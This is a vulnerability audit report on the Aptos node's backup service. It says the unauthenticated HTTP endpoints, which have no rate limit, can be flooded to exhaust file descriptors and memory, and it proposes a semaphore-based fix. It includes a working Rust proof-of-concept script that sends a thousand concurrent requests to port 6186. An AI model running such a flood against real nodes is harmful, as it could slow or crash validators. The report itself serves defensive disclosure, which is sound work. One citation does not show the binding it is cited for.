# Audit Report

## Title
Backup Service Resource Exhaustion via Unbounded Concurrent Request Handling

## Summary
The backup service lacks authentication and request rate limiting, allowing an attacker with network access to exhaust node resources by triggering thousands of concurrent backup requests. Each request creates a new tokio mpsc channel and spawns a blocking task, potentially exhausting file descriptors and memory, leading to node slowdowns or crashes.

## Finding Description

The backup service exposes HTTP endpoints without authentication or rate limiting. When a request is made to endpoints like `/state_snapshot/<version>`, `/transactions/<start>/<num>`, `/state_snapshot_chunk/<version>/<start>/<limit>`, or `/epoch_ending_ledger_infos/<start>/<end>`, the handler immediately creates a new `BytesSender` instance with an associated tokio mpsc channel (capacity 100) [1](#0-0) .

The channel creation happens synchronously in the request handler thread before spawning the blocking task [2](#0-1) . This means that thousands of concurrent HTTP requests will immediately create thousands of channels in memory, even though only 64 blocking tasks can actively process simultaneously due to the tokio runtime's `MAX_BLOCKING_THREADS` limit [3](#0-2) .

**Attack Flow:**
1. Attacker sends 10,000 concurrent GET requests to backup endpoints (e.g., `/transactions/0/1000000`)
2. Each request triggers `reply_with_bytes_sender()` which immediately creates a `BytesSender` with channel
3. Each request calls `spawn_blocking()` to process the backup data
4. 64 tasks execute immediately, remaining 9,936 tasks queue indefinitely (unbounded queue)
5. All 10,000 HTTP connections remain open, consuming file descriptors
6. All 10,000 channels exist in memory
7. Node experiences resource exhaustion (file descriptors, memory pressure)

**Deployment Context:**
In production Kubernetes deployments, the backup service is configured to bind to all interfaces [4](#0-3)  and is exposed via a Kubernetes ClusterIP service [5](#0-4) , making it accessible to any pod within the cluster.

The backup service runs in the same process as the validator/fullnode node [6](#0-5) , meaning resource exhaustion affects all node components including consensus and state sync.

**No Protections Present:**
- No authentication middleware on backup routes [7](#0-6) 
- No rate limiting on the server
- No concurrent request limits
- No connection pooling or backpressure before channel creation
- spawn_blocking queue is unbounded (tokio default behavior)

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:

**"Validator node slowdowns"**: An attacker flooding the backup service with thousands of concurrent requests will cause:
- File descriptor exhaustion (10,000+ open HTTP connections)
- Memory pressure from thousands of queued tasks and channels
- Database read contention from up to 64 concurrent backup operations
- Potential impact on other node services sharing the same process

**"API crashes"**: If file descriptors are exhausted, the node cannot accept new network connections for critical services (consensus messages, P2P networking, API requests), potentially causing the entire node to crash or become unresponsive.

The backup service shares the same process space with all critical node components, so resource exhaustion cascades to affect consensus participation, transaction processing, and state synchronization.

## Likelihood Explanation

**Likelihood: Medium**

The vulnerability is exploitable under the following conditions:

1. **Standard Kubernetes Deployment**: Production fullnode configurations bind to `0.0.0.0:6186` and expose via ClusterIP service, making the backup service accessible to any pod in the cluster. An attacker who compromises any pod or has cluster access can exploit this.

2. **Misconfigured Public Exposure**: If operators expose the backup service publicly (via LoadBalancer, Ingress, or port forwarding), any external attacker can exploit it without authentication.

3. **Default Secure But Non-Standard Deployments Vulnerable**: While the default configuration binds to localhost only [8](#0-7) , production deployments commonly override this for operational reasons.

The attack itself is trivial to execute - simple concurrent HTTP GET requests with no authentication required. The complexity lies in obtaining network access to port 6186, which varies by deployment configuration.

## Recommendation

Implement three layers of protection:

**1. Add Request Rate Limiting:**
Implement per-IP rate limiting on the backup service endpoints, similar to the pattern used in the faucet service. Limit requests to a reasonable number (e.g., 10 concurrent requests per IP).

**2. Add Concurrent Request Limiting:**
Wrap the backup service handlers with a `BoundedExecutor` or semaphore to limit total concurrent backup operations:

```rust
// In storage/backup/backup-service/src/lib.rs
use std::sync::Arc;
use tokio::sync::Semaphore;

const MAX_CONCURRENT_BACKUPS: usize = 10;

pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_BACKUPS));
    let routes = get_routes(backup_handler, semaphore);
    // ... rest of function
}

// In handlers/utils.rs - wrap reply_with_bytes_sender
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    semaphore: Arc<Semaphore>,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    // Try to acquire permit without blocking
    match semaphore.try_acquire() {
        Ok(permit) => {
            let (sender, stream) = bytes_sender::BytesSender::new(endpoint);
            let bh = backup_handler.clone();
            tokio::task::spawn_blocking(move || {
                let _permit = permit; // Hold permit until task completes
                let _timer = BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
                abort_on_error(f)(bh, sender)
            });
            Box::new(Response::new(Body::wrap_stream(stream)))
        },
        Err(_) => {
            // Return 429 Too Many Requests
            Box::new(warp::http::StatusCode::TOO_MANY_REQUESTS)
        }
    }
}
```

**3. Add Authentication:**
Implement token-based or mutual TLS authentication for the backup service, following the pattern used in the admin service with `PasscodeSha256` authentication.

**4. Documentation:**
Update deployment documentation to explicitly warn operators that exposing port 6186 publicly without additional protection (firewall, VPN, authentication) creates a DoS risk.

## Proof of Concept

```rust
// Save as backup_flood_test.rs
// Compile with: cargo build --release
// Run with: cargo run --release

use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() {
    // Target backup service (adjust address as needed)
    let target = "http://127.0.0.1:6186";
    
    // Number of concurrent requests to send
    let num_requests = 1000;
    
    println!("Sending {} concurrent requests to backup service...", num_requests);
    
    let mut handles = vec![];
    
    for i in 0..num_requests {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .timeout(Duration::from_secs(300))
                .build()
                .unwrap();
            
            // Send request to state_snapshot endpoint
            // This triggers BytesSender::new() and spawn_blocking()
            let result = client
                .get(&format!("{}/state_snapshot/0", target))
                .send()
                .await;
            
            match result {
                Ok(resp) => println!("Request {} - Status: {}", i, resp.status()),
                Err(e) => println!("Request {} - Error: {}", i, e),
            }
        });
        
        handles.push(handle);
        
        // Small delay to avoid overwhelming the client side
        if i % 100 == 0 {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }
    
    // Wait for all requests to complete or timeout
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Attack completed. Monitor target node for resource exhaustion.");
}
```

**Expected Behavior (Vulnerable):**
- 1000+ channels created immediately
- Only 64 blocking threads actively processing
- 936+ tasks queued waiting for threads
- File descriptors consumed for all HTTP connections
- Node experiences slowdown or potential crash if file descriptor limit exceeded

**Expected Behavior (After Fix):**
- Only 10 concurrent requests processed (semaphore limit)
- Remaining requests receive HTTP 429 Too Many Requests
- Resource consumption bounded and predictable

**Verification:**
Monitor the target node during the attack:
```bash
# Check open file descriptors
lsof -p <node_pid> | wc -l

# Check memory usage
ps aux | grep aptos-node

# Check backup service metrics
curl http://localhost:9101/metrics | grep backup_service
```

## Notes

While this vulnerability exists in the code, its exploitability is highly dependent on deployment configuration:

- **Secure by default**: The default configuration binds to `127.0.0.1:6186`, preventing external exploitation [9](#0-8) 

- **Kubernetes deployments**: Use `0.0.0.0:6186` binding [10](#0-9)  with ClusterIP service type, requiring cluster access to exploit

- **Process impact**: The backup service runs in the same process as all node components [11](#0-10) , so resource exhaustion affects consensus and transaction processing

The lack of authentication and rate limiting represents a defense-in-depth failure. Even though network-level access controls (localhost binding, ClusterIP service) provide primary protection, the application should implement its own limits to prevent abuse in scenarios where network protections are misconfigured or bypassed.

### Citations

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L28-42)
```rust
    pub fn new(
        endpoint: &'static str,
    ) -> (Self, tokio_stream::wrappers::ReceiverStream<BytesResult>) {
        let (bytes_tx, bytes_rx) = tokio::sync::mpsc::channel(Self::MAX_BATCHES);

        let myself = Self {
            buffer: BytesMut::new(),
            bytes_tx,
            endpoint,
        };

        let stream = tokio_stream::wrappers::ReceiverStream::new(bytes_rx);

        (myself, stream)
    }
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L46-65)
```rust
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);

    // spawn and forget, error propagates through the `stream: TryStream<_>`
    let bh = backup_handler.clone();
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L13-16)
```yaml
  # be backwards compatible with the old identity config
  {{ with index $.Values.fullnode.config.full_node_networks 0 }}
  {{- if $.Values.fullnode_identity }}
  identity:
```

**File:** terraform/helm/fullnode/templates/service.yaml (L42-56)
```yaml
apiVersion: v1
kind: Service
metadata:
  name: {{ include "aptos-fullnode.fullname" . }}
  labels:
    {{- include "aptos-fullnode.labels" . | nindent 4 }}
spec:
  selector:
    {{- include "aptos-fullnode.selectorLabels" . | nindent 4 }}
    app.kubernetes.io/name: fullnode
  ports:
  - name: backup
    port: 6186
  - name: metrics
    port: 9101
```

**File:** aptos-node/src/storage.rs (L63-73)
```rust
    let (aptos_db_reader, db_rw, backup_service) = match FastSyncStorageWrapper::initialize_dbs(
        node_config,
        internal_indexer_db.clone(),
        update_sender,
    )? {
        Either::Left(db) => {
            let (db_arc, db_rw) = DbReaderWriter::wrap(db);
            let db_backup_service =
                start_backup_service(node_config.storage.backup_service_address, db_arc.clone());
            maybe_apply_genesis(&db_rw, node_config)?;
            (db_arc as Arc<dyn DbReader>, db_rw, Some(db_backup_service))
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L27-147)
```rust
pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // GET db_state
    let bh = backup_handler.clone();
    let db_state = warp::path::end()
        .map(move || reply_with_bcs_bytes(DB_STATE, &bh.get_db_state()?))
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transaction_range_proof/<first_version>/<last_version>
    let bh = backup_handler;
    let transaction_range_proof = warp::path!(Version / Version)
        .map(move |first_version, last_version| {
            reply_with_bcs_bytes(
                TRANSACTION_RANGE_PROOF,
                &bh.get_transaction_range_proof(first_version, last_version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // Route by endpoint name.
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));

    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
}
```

**File:** config/src/config/storage_config.rs (L433-454)
```rust
impl Default for StorageConfig {
    fn default() -> StorageConfig {
        StorageConfig {
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
            dir: PathBuf::from("db"),
            hot_state_config: HotStateConfig::default(),
            // The prune window must at least out live a RPC request because its sub requests are
            // to return a consistent view of the DB at exactly same version. Considering a few
            // thousand TPS we are potentially going to achieve, and a few minutes a consistent view
            // of the DB might require, 10k (TPS)  * 100 (seconds)  =  1 Million might be a
            // conservatively safe minimal prune window. It'll take a few Gigabytes of disk space
            // depending on the size of an average account blob.
            storage_pruner_config: PrunerConfig::default(),
            data_dir: PathBuf::from("/opt/aptos/data"),
            rocksdb_configs: RocksdbConfigs::default(),
            enable_indexer: false,
            db_path_overrides: None,
            buffered_state_target_items: BUFFERED_STATE_TARGET_ITEMS,
            max_num_nodes_per_lru_cache_shard: DEFAULT_MAX_NUM_NODES_PER_LRU_CACHE_SHARD,
            ensure_rlimit_nofile: 0,
            assert_rlimit_nofile: false,
        }
```
